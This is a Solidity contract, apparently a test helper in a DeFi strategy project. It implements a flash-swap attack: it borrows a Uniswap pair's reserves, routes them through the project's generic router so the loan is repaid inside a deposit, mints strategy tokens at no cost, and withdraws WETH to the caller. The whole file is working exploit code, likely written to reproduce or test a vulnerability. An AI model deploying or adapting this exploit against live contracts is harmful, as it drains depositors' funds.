//SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../helpers/Multicall.sol";
import "../interfaces/IStrategy.sol";
import "../interfaces/IStrategyController.sol";
import "../interfaces/IStrategyRouter.sol";

contract FlashSwapAttack is IUniswapV2Callee, Multicall {
    uint256 private DEFAULT_SLIPPAGE = 995;
    IStrategyController public controller;
    IStrategyRouter public genericRouter;
    IStrategyRouter public loopRouter;
    address public weth;

    constructor(address controller_, address genericRouter_, address loopRouter_, address weth_) public {
        controller = IStrategyController(controller_);
        genericRouter = IStrategyRouter(genericRouter_);
        loopRouter = IStrategyRouter(loopRouter_);
        weth = weth_;
    }

    function initiateAttack(IUniswapV2Pair pair, address strategy) external {
        bytes memory data = abi.encode(strategy);
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
        pair.swap(uint256(reserve0) - 1, uint256(reserve1) - 1, address(this), data);
    }

    function withdrawWETH(IStrategy strategy) external {
        controller.withdrawWETH(strategy, loopRouter, strategy.balanceOf(address(this)), DEFAULT_SLIPPAGE, new bytes(0));
        uint256 balance = IERC20(weth).balanceOf(address(this));
        require(balance > 0, "Failed to withdraw weth");
        IERC20(weth).transfer(msg.sender, balance);
    }

    function uniswapV2Call(address, uint amount0, uint amount1, bytes calldata data) external override {
        (IStrategy strategy) = abi.decode(data, (IStrategy));
        IUniswapV2Pair pair = IUniswapV2Pair(msg.sender);
        IERC20 token0 = IERC20(pair.token0());
        IERC20 token1 = IERC20(pair.token1());
        // Update amounts to cover fees (fees need to be covered by attacker by being sent ahead of time)
        amount0 = (amount0*1000)/996;
        amount1 = (amount1*1000)/996;
        // Transfer tokens to generic genericRouter
        token0.transfer(address(genericRouter), amount0);
        token1.transfer(address(genericRouter), amount1);
        // Setup calls to return funds to pair contract
        Call[] memory calls = new Call[](2);
        calls[0] = Call(
            address(token0),
            abi.encodeWithSelector(
                token0.transfer.selector,
                msg.sender,
                amount0
            )
        );
        calls[1] = Call(
            address(token1),
            abi.encodeWithSelector(
                token1.transfer.selector,
                msg.sender,
                amount1
            )
        );
        bytes memory callsData = abi.encode(calls);
        controller.deposit(strategy, genericRouter, 0, DEFAULT_SLIPPAGE, callsData);
        uint256 balance = strategy.balanceOf(address(this));
        require(balance > 0, "Failed to mint tokens");
    }
}
